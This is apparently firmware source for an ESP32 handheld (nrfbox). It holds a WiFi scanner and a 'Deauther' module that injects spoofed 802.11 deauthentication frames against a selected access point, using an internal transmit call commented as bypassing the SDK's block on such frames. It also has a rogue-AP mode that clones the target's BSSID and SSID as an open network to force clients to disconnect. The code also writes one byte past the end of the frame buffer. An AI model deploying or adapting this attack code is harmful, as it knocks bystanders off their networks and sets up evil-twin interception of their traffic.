/* ____________________________
   This software is licensed under the MIT License:
   https://github.com/cifertech/nrfbox
   ________________________________________ */

#include "config.h"
#include "icon.h"

// Bypasses ROM blob frame type check that blocks deauth (0xC0) on SDK 2.x
extern "C" esp_err_t esp_wifi_internal_tx(wifi_interface_t wifi_if, void *buffer, uint16_t len);

namespace WifiScan {
  
int currentIndex = 0;
int listStartIndex = 0;
bool isDetailView = false;
unsigned long scan_StartTime = 0;
const unsigned long scanTimeout = 2000;
bool isScanComplete = false;

unsigned long lastButtonPress = 0;
unsigned long debounceTime = 200;

// Scroll state for selected network name
int   scanScrollOffset    = 0;
int   scanLastScrollIndex = -1;
unsigned long scanLastScrollTime  = 0;
bool  scanScrollPaused    = false;
unsigned long scanScrollPauseStart = 0;
const unsigned long SCAN_SCROLL_SPEED = 120;
const unsigned long SCAN_SCROLL_PAUSE = 800;

void wifiscanSetup() {
  Serial.begin(115200);
  u8g2.setFont(u8g2_font_6x10_tr);
  
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  
  pinMode(BUTTON_UP_PIN, INPUT_PULLUP);
  pinMode(BUTTON_DOWN_PIN, INPUT_PULLUP);
  pinMode(BTN_PIN_RIGHT, INPUT_PULLUP);
  pinMode(BTN_PIN_LEFT, INPUT_PULLUP);
  
  for (int cycle = 0; cycle < 3; cycle++) { 
    for (int i = 0; i < 3; i++) {
      u8g2.clearBuffer();
      u8g2.setFont(u8g2_font_6x10_tr);
      u8g2.drawStr(0, 10, "Scanning WiFi");

      String dots = "";
      for (int j = 0; j <= i; j++) {
        dots += ".";
        setNeoPixelColour("white");
      }
      setNeoPixelColour("0");
      
      u8g2.drawStr(80, 10, dots.c_str()); 

      u8g2.sendBuffer();
      delay(300); 
    }
  }
  
  scan_StartTime = millis();
  isScanComplete = false;
}

void wifiscanLoop() {
  unsigned long currentMillis = millis();

  if (!isScanComplete && currentMillis - scan_StartTime < scanTimeout) {
    int foundNetworks = WiFi.scanNetworks();
    if (foundNetworks >= 0) {
      isScanComplete = true;
    }
  }

  if (currentMillis - lastButtonPress > debounceTime) {
    if (digitalRead(BUTTON_UP_PIN) == LOW) {
      if (currentIndex > 0) {
        currentIndex--;
        if (currentIndex < listStartIndex) {
          listStartIndex--;
        }
      }
      lastButtonPress = currentMillis;
    } else if (digitalRead(BUTTON_DOWN_PIN) == LOW) {
      if (currentIndex < WiFi.scanComplete() - 1) {
        currentIndex++;
        if (currentIndex >= listStartIndex + 5) {
          listStartIndex++;
        }
      }
      lastButtonPress = currentMillis;
    } else if (digitalRead(BTN_PIN_RIGHT) == LOW) {
      isDetailView = true;
      lastButtonPress = currentMillis;
    }
  }

  if (!isDetailView && isScanComplete) {
    unsigned long now = millis();

    // Reset scroll when selection changes
    if (currentIndex != scanLastScrollIndex) {
      scanScrollOffset     = 0;
      scanScrollPaused     = false;
      scanLastScrollIndex  = currentIndex;
      scanLastScrollTime   = now;
    }

    // Advance scroll for selected network
    String selName = WiFi.SSID(currentIndex);
    int maxVisible = 11; // chars visible in the scroll area (66px / 6px per char)
    bool needsScroll = (int)selName.length() > maxVisible;
    if (needsScroll) {
      if (scanScrollPaused) {
        if (now - scanScrollPauseStart >= SCAN_SCROLL_PAUSE) {
          scanScrollPaused = false;
          scanLastScrollTime = now;
        }
      } else {
        if (now - scanLastScrollTime >= SCAN_SCROLL_SPEED) {
          scanScrollOffset++;
          if (scanScrollOffset > (int)selName.length() - maxVisible) {
            scanScrollOffset = 0;
            scanScrollPaused = true;
            scanScrollPauseStart = now;
          }
          scanLastScrollTime = now;
        }
      }
    }

    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 10, "Wi-Fi Networks:");

    int networkCount = WiFi.scanComplete();
    for (int i = 0; i < 5; i++) {
      int idx = i + listStartIndex;
      if (idx >= networkCount) break;

      String name = WiFi.SSID(idx);
      int rssi    = WiFi.RSSI(idx);
      int yPos    = 23 + i * 10;

      u8g2.setFont(u8g2_font_6x10_tr);

      if (idx == currentIndex) {
        u8g2.drawStr(0, yPos, ">");
        // Scrolling name for selected row
        String visible = needsScroll
          ? name.substring(scanScrollOffset, scanScrollOffset + maxVisible)
          : name.substring(0, maxVisible);
        u8g2.drawStr(10, yPos, visible.c_str());
      } else {
        // Static truncated name with ~ if cut off
        String disp = name.length() > (size_t)maxVisible
          ? name.substring(0, maxVisible - 1) + "~"
          : name;
        u8g2.drawStr(10, yPos, disp.c_str());
      }

      // RSSI on the right
      String rssiStr = String(rssi);
      u8g2.drawStr(80, yPos, rssiStr.c_str());
    }
    u8g2.sendBuffer();
  }

  // Drive scroll animation when idle on list screen
  static unsigned long last_scan_list_refresh = 0;
  if (!isDetailView && isScanComplete && WiFi.scanComplete() > 0) {
    if (millis() - last_scan_list_refresh >= 120) {
      last_scan_list_refresh = millis();
      // Redraws handled above in the same loop pass — trigger next pass quickly
    }
  }

  if (isDetailView) {
    String networkName = WiFi.SSID(currentIndex);
    String networkBSSID = WiFi.BSSIDstr(currentIndex);
    int rssi = WiFi.RSSI(currentIndex);
    int channel = WiFi.channel(currentIndex);

    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 10, "Network Details:");

    u8g2.setFont(u8g2_font_5x8_tr);
    String name = "SSID: " + networkName;
    String bssid = "BSSID: " + networkBSSID;
    String signal = "RSSI: " + String(rssi);
    String ch = "Channel: " + String(channel);

    u8g2.drawStr(0, 20, name.c_str());
    u8g2.drawStr(0, 30, bssid.c_str());
    u8g2.drawStr(0, 40, signal.c_str());
    u8g2.drawStr(0, 50, ch.c_str());
    u8g2.drawStr(0, 60, "Press LEFT to go back");
    u8g2.sendBuffer();

    if (digitalRead(BTN_PIN_LEFT) == LOW) {
      isDetailView = false;
      lastButtonPress = currentMillis;
      }
    }
  }
}

namespace Deauther {

const int networks_per_page = 5;
int currentIndex = 0;
int listStartIndex = 0;
bool isDetailView = false;
unsigned long scan_StartTime = 0;
const unsigned long scanTimeout = 2000;
bool isScanComplete = false;

unsigned long lastButtonPress = 0;
unsigned long lastRightButtonPress = 0; 
const unsigned long debounceTime = 200; 
const unsigned long rightDebounceTime = 50; 

uint8_t deauth_frame_default[26] = {
    0xC0, 0x00,                         // type, subtype c0: deauth
    0x00, 0x00,                         // duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // receiver (target)
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (AP)
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (AP)
    0x00, 0x00,                         // fragment & sequence number
    0x01, 0x00                          // reason code
};
uint8_t deauth_frame[sizeof(deauth_frame_default)];

uint32_t packet_count = 0;
uint32_t success_count = 0;
uint32_t consecutive_failures = 0;
bool attack_running = false;
int attackMode = 0; // 0 = Deauth Frames, 1 = Rogue AP
wifi_ap_record_t selectedAp;
uint8_t selectedChannel;
int network_count = 0;
wifi_ap_record_t *ap_list = nullptr;
bool scanning = false;
uint32_t last_packet_time = 0;
String lastNeoPixelColour = "0"; 

// Scroll state for selected network name
int scrollOffset = 0;
int lastScrollIndex = -1;
unsigned long lastScrollTime = 0;
const unsigned long SCROLL_SPEED_MS = 120;
const unsigned long SCROLL_PAUSE_MS = 800;
bool scrollPaused = false;
unsigned long scrollPauseStart = 0;

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
    esp_err_t res = esp_wifi_internal_tx(WIFI_IF_AP, (void*)frame_buffer, (uint16_t)size);
    packet_count++;
    if (res == ESP_OK) {
        success_count++;
        consecutive_failures = 0;
    } else {
        consecutive_failures++;
    }
}

void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, uint8_t chan) {
    esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&deauth_frame[10], ap_record->bssid, 6); 
    memcpy(&deauth_frame[16], ap_record->bssid, 6); 
    deauth_frame[26] = 7;
    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
}

int compare_ap(const void *a, const void *b) {
    wifi_ap_record_t *ap1 = (wifi_ap_record_t *)a;
    wifi_ap_record_t *ap2 = (wifi_ap_record_t *)b;
    return ap2->rssi - ap1->rssi; 
}

void drawScanScreen() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 10, "Wi-Fi Networks:");
    
    if (scanning) {

    u8g2.setFont(u8g2_font_6x10_tr);
    for (int cycle = 0; cycle < 3; cycle++) {
        for (int i = 0; i < 3; i++) {
            u8g2.clearBuffer();
            u8g2.drawStr(0, 10, "Scanning WiFi");
            String dots = "";
            for (int j = 0; j <= i; j++) {
                dots += ".";
            }
            u8g2.setFont(u8g2_font_6x10_tr);
            u8g2.drawStr(80, 10, dots.c_str());
            setNeoPixelColour("white");
            u8g2.sendBuffer();
            delay(300);
        }
    }
        if (lastNeoPixelColour != "white") {
            setNeoPixelColour("white");
            lastNeoPixelColour = "white";
        }
        u8g2.sendBuffer();
        return;
    }

    if (network_count == 0) {
        u8g2.drawStr(10, 30, "No networks found.");
    } else {
        u8g2.setFont(u8g2_font_6x10_tr);
        const int maxNameChars = 8; // chars visible in name column

        // Reset scroll if selection changed
        if (lastScrollIndex != currentIndex) {
            scrollOffset = 0;
            lastScrollIndex = currentIndex;
            scrollPaused = true;
            scrollPauseStart = millis();
        }

        // Advance scroll ticker for selected network
        String selectedName = String((char*)ap_list[currentIndex].ssid);
        if ((int)selectedName.length() > maxNameChars) {
            if (scrollPaused) {
                if (millis() - scrollPauseStart >= SCROLL_PAUSE_MS) {
                    scrollPaused = false;
                }
            } else if (millis() - lastScrollTime >= SCROLL_SPEED_MS) {
                lastScrollTime = millis();
                scrollOffset++;
                if (scrollOffset > (int)selectedName.length() - maxNameChars) {
                    scrollOffset = 0;
                    scrollPaused = true;
                    scrollPauseStart = millis();
                }
            }
        }

        for (int i = 0; i < networks_per_page; i++) {
            int currentNetworkIndex = i + listStartIndex;
            if (currentNetworkIndex >= network_count) break;

            String networkName = String((char*)ap_list[currentNetworkIndex].ssid);
            int rssi = ap_list[currentNetworkIndex].rssi;
            String networkRssi = String(rssi);

            String displayName;
            if (currentNetworkIndex == currentIndex) {
                // Scrolling name for selected
                displayName = networkName.substring(scrollOffset, scrollOffset + maxNameChars);
                u8g2.drawStr(0, 23 + i * 10, ">");
            } else {
                // Truncated with ~ for non-selected
                if ((int)networkName.length() > maxNameChars) {
                    displayName = networkName.substring(0, maxNameChars - 1) + "~";
                } else {
                    displayName = networkName;
                }
            }
            u8g2.drawStr(10, 23 + i * 10, displayName.c_str());
            u8g2.drawStr(58, 23 + i * 10, networkRssi.c_str());
        }
    }

    if (lastNeoPixelColour != "0") {
        setNeoPixelColour("0");
        lastNeoPixelColour = "0";
    }
    u8g2.sendBuffer();
}

bool scanNetworks() {
    scanning = true;
    currentIndex = 0;
    listStartIndex = 0;
    drawScanScreen();
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(1);

    network_count = WiFi.scanNetworks();
    if (network_count == 0) {
        scanning = false;
        drawScanScreen();
        isScanComplete = true;
        return false;
    }

    if (ap_list) free(ap_list);
    ap_list = (wifi_ap_record_t *)malloc(network_count * sizeof(wifi_ap_record_t));
    if (!ap_list) {
        scanning = false;
        drawScanScreen();
        isScanComplete = false;
        return false;
    }

    for (int i = 0; i < network_count; i++) {
        wifi_ap_record_t ap_record = {};
        memcpy(ap_record.bssid, WiFi.BSSID(i), 6);
        strncpy((char*)ap_record.ssid, WiFi.SSID(i).c_str(), sizeof(ap_record.ssid));
        ap_record.rssi = WiFi.RSSI(i);
        ap_record.primary = WiFi.channel(i);
        ap_record.authmode = WiFi.encryptionType(i);
        ap_list[i] = ap_record;
    }
    qsort(ap_list, network_count, sizeof(wifi_ap_record_t), compare_ap);
    scanning = false;
    drawScanScreen();
    isScanComplete = true;
    return true;
}

bool checkApChannel(const uint8_t *bssid, uint8_t *channel) {
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    int n = WiFi.scanNetworks();
    for (int i = 0; i < n; i++) {
        if (memcmp(WiFi.BSSID(i), bssid, 6) == 0) {
            *channel = WiFi.channel(i);
            WiFi.mode(WIFI_AP);
            delay(100);
            return true;
        }
    }

    WiFi.mode(WIFI_AP);
    delay(100);
    return false;
}


// ---- Attack Method Selection Screen ----
int selectAttackMethod() {
    int selected = 0;
    bool upWas = false, downWas = false, rightWas = false, leftWas = false;

    while (true) {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(0, 10, "Select Attack:");
        u8g2.drawHLine(0, 12, 128);
        u8g2.setFont(u8g2_font_5x8_tr);

        // Show target name
        char tgt[20];
        snprintf(tgt, sizeof(tgt), "Target: %.14s", (char*)selectedAp.ssid);
        u8g2.drawStr(0, 23, tgt);

        // Method options
        if (selected == 0) u8g2.drawStr(0, 36, "> Deauth Frames");
        else               u8g2.drawStr(0, 36, "  Deauth Frames");
        u8g2.setFont(u8g2_font_4x6_tr);
        u8g2.drawStr(8, 44, "Injects 802.11 deauth pkts");
        u8g2.setFont(u8g2_font_5x8_tr);

        if (selected == 1) u8g2.drawStr(0, 55, "> Rogue AP");
        else               u8g2.drawStr(0, 55, "  Rogue AP");
        u8g2.setFont(u8g2_font_4x6_tr);
        u8g2.drawStr(8, 63, "Clones AP MAC, forces disconnect");
        u8g2.setFont(u8g2_font_5x8_tr);

        u8g2.sendBuffer();

        bool up    = !digitalRead(BUTTON_UP_PIN);
        bool down  = !digitalRead(BUTTON_DOWN_PIN);
        bool right = !digitalRead(BTN_PIN_RIGHT);
        bool left  = !digitalRead(BTN_PIN_LEFT);

        if ((up && !upWas) || (down && !downWas)) {
            selected = 1 - selected; // toggle between 0 and 1
            delay(150);
        }
        if (right && !rightWas) {
            delay(150);
            return selected;
        }
        if (left && !leftWas) {
            delay(150);
            return -1; // cancelled
        }

        upWas = up; downWas = down; rightWas = right; leftWas = left;
        delay(20);
    }
}

// ---- Rogue AP Attack ----
bool rogueApActive = false;

void startRogueAp() {
    // Stop existing WiFi cleanly
    esp_wifi_stop();
    delay(100);

    // Set our MAC to match the target AP's BSSID exactly
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_start();
    esp_wifi_set_mac(WIFI_IF_AP, selectedAp.bssid);

    // Clone the target AP config
    wifi_config_t ap_config = {};
    strncpy((char*)ap_config.ap.ssid, (char*)selectedAp.ssid, sizeof(ap_config.ap.ssid));
    ap_config.ap.ssid_len = strlen((char*)selectedAp.ssid);
    ap_config.ap.channel = selectedChannel;
    // Open auth so clients associate quickly
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
    ap_config.ap.ssid_hidden = 0;
    ap_config.ap.max_connection = 8;
    ap_config.ap.beacon_interval = 100;
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);

    rogueApActive = true;
    Serial.printf("[ROGUE AP] Cloning SSID: %s on ch %d\n", (char*)selectedAp.ssid, selectedChannel);
    Serial.printf("[ROGUE AP] MAC set to: %02X:%02X:%02X:%02X:%02X:%02X\n",
        selectedAp.bssid[0], selectedAp.bssid[1], selectedAp.bssid[2],
        selectedAp.bssid[3], selectedAp.bssid[4], selectedAp.bssid[5]);
}

void stopRogueAp() {
    esp_wifi_stop();
    delay(100);
    // Restore a neutral AP with our real MAC
    uint8_t defaultMac[6];
    esp_read_mac(defaultMac, ESP_MAC_WIFI_SOFTAP);
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_start();
    esp_wifi_set_mac(WIFI_IF_AP, defaultMac);
    rogueApActive = false;
    Serial.println("[ROGUE AP] Stopped");
}

void resetWifi() {
    esp_wifi_stop();
    delay(200);
    esp_wifi_start();
    delay(200);
    packet_count = 0;
    success_count = 0;
    consecutive_failures = 0;
}

void drawAttackScreen(bool fullRedraw = true) {
    if (fullRedraw) {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(0, 10, "Network Details:");
        u8g2.setFont(u8g2_font_5x8_tr);

        static String name = "";
        static String bssid = "";
        static String signal = "";
        static String ch = "";
        static String authStr = "";
        if (!isDetailView) { 
            name = "";
            bssid = "";
            signal = "";
            ch = "";
            authStr = "";
        } else if (name.isEmpty()) { 
            name = "SSID: " + String((char*)selectedAp.ssid).substring(0, 15);
            bssid = "BSSID: " + String(selectedAp.bssid[0], HEX) + ":" + String(selectedAp.bssid[1], HEX) + ":" +
                    String(selectedAp.bssid[2], HEX) + ":" + String(selectedAp.bssid[3], HEX) + ":" +
                    String(selectedAp.bssid[4], HEX) + ":" + String(selectedAp.bssid[5], HEX);
            signal = "RSSI: " + String(selectedAp.rssi);
            ch = "Ch: " + String(selectedChannel);
            String auth;
            switch (selectedAp.authmode) {
                case WIFI_AUTH_OPEN: auth = "OPEN"; break;
                case WIFI_AUTH_WPA_PSK: auth = "WPA-PSK"; break;
                case WIFI_AUTH_WPA2_PSK: auth = "WPA2-PSK"; break;
                case WIFI_AUTH_WPA_WPA2_PSK: auth = "WPA/WPA2"; break;
                default: auth = "Unknown"; break;
            }
            authStr = "Auth: " + auth;
        }

        u8g2.drawStr(0, 20, name.c_str());
        u8g2.drawStr(0, 30, authStr.c_str());
    } else {
        u8g2.setFont(u8g2_font_5x8_tr);
        u8g2.setDrawColor(0);
        u8g2.drawBox(0, 36, 128, 28);
        u8g2.setDrawColor(1);
    }

    u8g2.setFont(u8g2_font_5x8_tr);

    // Show attack method
    if (attackMode == 0) {
        u8g2.drawStr(0, 40, "Mode:DeauthFrames");
    } else {
        u8g2.drawStr(0, 40, "Mode:Rogue AP");
    }

    // Bold status indicator
    if (attack_running) {
        u8g2.drawStr(70, 40, "RUNNING");
    } else {
        u8g2.drawStr(70, 40, "STOPPED");
    }

    String packets = "Pkts:" + String(packet_count);
    float success_rate = (packet_count > 0) ? (float)success_count / packet_count * 100 : 0;
    String success = "Succ:" + String(success_rate, 0) + "%";

    u8g2.drawStr(70, 40, packets.c_str());
    u8g2.drawStr(0, 51, success.c_str());

    // Dynamic button hints
    if (attack_running) {
        u8g2.drawStr(0, 63, "RIGHT:Stop  LEFT:Back");
    } else {
        u8g2.drawStr(0, 63, "RIGHT:Start LEFT:Back");
    }

    setNeoPixelColour(attack_running ? "orange" : "0");
    u8g2.sendBuffer();
}

void handleButtons() {
    unsigned long currentMillis = millis();

    if (digitalRead(BTN_PIN_RIGHT) == LOW && currentMillis - lastRightButtonPress >= rightDebounceTime && !scanning) {
        unsigned long start = micros(); 
        lastRightButtonPress = currentMillis;

        delayMicroseconds(400);
        if (digitalRead(BTN_PIN_RIGHT) != LOW) return;

        if (!isDetailView && network_count > 0) {
            selectedAp = ap_list[currentIndex];
            selectedChannel = ap_list[currentIndex].primary;
            isDetailView = true;
            attack_running = false;
            packet_count = 0;
            success_count = 0;
            consecutive_failures = 0;
            drawAttackScreen();
        } else if (isDetailView) {
            bool prev_running = attack_running;
            attack_running = !attack_running;
            if (!attack_running) {
                last_packet_time = 0;
                if (attackMode == 1 && rogueApActive) {
                    stopRogueAp();
                } else {
                    esp_wifi_stop();
                    delay(100);
                    esp_wifi_start();
                }
            } else if (!prev_running) {
                if (attackMode == 0) esp_wifi_start();
            }
            Serial.print("Right pressed, attack: "); Serial.println(attack_running ? "Running" : "Stopped");
            drawAttackScreen(false);
        }
        while (digitalRead(BTN_PIN_RIGHT) == LOW); 
        Serial.print("Toggle latency: "); Serial.println(micros() - start); 
    }

    if (currentMillis - lastButtonPress < debounceTime || scanning) return;

    if (digitalRead(BUTTON_UP_PIN) == LOW) {
        if (!isDetailView && currentIndex > 0) {
            currentIndex--;
            if (currentIndex < listStartIndex) {
                listStartIndex--;
            }
            drawScanScreen();
        }
        lastButtonPress = currentMillis;
        while (digitalRead(BUTTON_UP_PIN) == LOW); 
    } else if (digitalRead(BUTTON_DOWN_PIN) == LOW) {
        if (!isDetailView && currentIndex < network_count - 1) {
            currentIndex++;
            if (currentIndex >= listStartIndex + networks_per_page) {
                listStartIndex++;
            }
            drawScanScreen();
        }
        lastButtonPress = currentMillis;
        while (digitalRead(BUTTON_DOWN_PIN) == LOW); 
    } else if (digitalRead(BTN_PIN_LEFT) == LOW) {
        if (isDetailView) { 
            attack_running = false;
            last_packet_time = 0;
            esp_wifi_stop(); 
            isDetailView = false;
            drawScanScreen();
        }
        lastButtonPress = currentMillis;
        while (digitalRead(BTN_PIN_LEFT) == LOW); 
    }
}

void deautherSetup() {
    Serial.begin(115200);
    u8g2.begin();

    pinMode(BUTTON_UP_PIN, INPUT_PULLUP);
    pinMode(BUTTON_DOWN_PIN, INPUT_PULLUP);
    pinMode(BTN_PIN_RIGHT, INPUT_PULLUP);
    pinMode(BTN_PIN_LEFT, INPUT_PULLUP);

    setNeoPixelColour("0");
    lastNeoPixelColour = "0";

    // Ask user to pick attack method BEFORE scanning
    int chosen = selectAttackMethod();
    if (chosen == -1) {
        // User pressed LEFT to cancel - go back to main menu
        return;
    }
    attackMode = chosen;

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();

    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_max_tx_power(82));
    ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));

    wifi_config_t ap_config = {};
    strncpy((char*)ap_config.ap.ssid, "ESP32DIV", sizeof(ap_config.ap.ssid));
    ap_config.ap.ssid_len = strlen("ESP32DIV");
    strncpy((char*)ap_config.ap.password, "deauth123", sizeof(ap_config.ap.password));
    ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
    ap_config.ap.ssid_hidden = 0;
    ap_config.ap.max_connection = 4;
    ap_config.ap.beacon_interval = 100;
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));

    scan_StartTime = millis();
    isScanComplete = false;
    scanNetworks();
}

void deautherLoop() {
    handleButtons(); 

    unsigned long currentMillis = millis();
    if (!isScanComplete && currentMillis - scan_StartTime < scanTimeout) {
        if (WiFi.scanComplete() >= 0) {
            isScanComplete = true;
            drawScanScreen();
        }
    }

    if (attack_running && isDetailView) {
        uint32_t heap = ESP.getFreeHeap();
        if (heap < 80000) {
            attack_running = false;
            last_packet_time = 0;
            esp_wifi_stop();
            drawAttackScreen();
            delay(3000);
            return;
        }

        if (consecutive_failures > 10) {
            resetWifi();
            drawAttackScreen();
            delay(3000);
            return;
        }

        if (attackMode == 0) {
            // Deauth frame injection
            if (currentMillis - last_packet_time >= 100) {
                wsl_bypasser_send_deauth_frame(&selectedAp, selectedChannel);
                last_packet_time = currentMillis;
            }
        } else {
            // Rogue AP — start once, then just monitor
            if (!rogueApActive) {
                startRogueAp();
                last_packet_time = currentMillis;
            }
        }
    }

    static uint32_t last_channel_check = 0;
    if (attack_running && currentMillis - last_channel_check > 15000) {
        uint8_t new_channel;
        if (checkApChannel(selectedAp.bssid, &new_channel)) {
            if (new_channel != selectedChannel) {
                selectedChannel = new_channel;
                wifi_config_t ap_config = {};
                strncpy((char*)ap_config.ap.ssid, "nRF-BOX", sizeof(ap_config.ap.ssid));
                ap_config.ap.ssid_len = strlen("nRF-BOX");
                strncpy((char*)ap_config.ap.password, "deauth123", sizeof(ap_config.ap.password));
                ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
                ap_config.ap.ssid_hidden = 0;
                ap_config.ap.max_connection = 4;
                ap_config.ap.beacon_interval = 100;
                ap_config.ap.channel = selectedChannel;
                ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
            }
        }
        last_channel_check = currentMillis;
    }

    static uint32_t last_status_time = 0;
    if (attack_running && currentMillis - last_status_time > 2000) {
        drawAttackScreen(false); 
        last_status_time = currentMillis;
    }

    // Refresh scan list screen to drive scroll animation when idle
    static uint32_t last_scan_refresh = 0;
    if (!attack_running && !isDetailView && isScanComplete && network_count > 0) {
        if (currentMillis - last_scan_refresh >= 120) {
            drawScanScreen();
            last_scan_refresh = currentMillis;
        }
    }
  }
} 
